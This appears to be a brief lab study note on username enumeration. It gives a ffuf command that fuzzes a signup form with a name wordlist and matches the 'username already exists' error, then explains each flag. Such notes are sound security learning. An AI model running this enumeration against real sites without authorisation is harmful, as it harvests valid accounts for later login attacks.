___
- tags: #authentication_bypass #ffuf
___
Website error messages are great resources for collating this information to build our list of valid usernames.

## FFUF [^1]

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.201.78.121/customers/signup -mr "username already exists"
```

### Arguments
- -w -> specifies wordlist.
- -X -> specifies request method.
- -d -> specifies data to send.
- -H -> adding aditional headers to request.
- -u -> specifies url
- -mr -> specifies text on the page we are looking for to validate we've found a valid username.

___
## Referencia
[^1]: [FFUF](https://github.com/ffuf/ffuf)

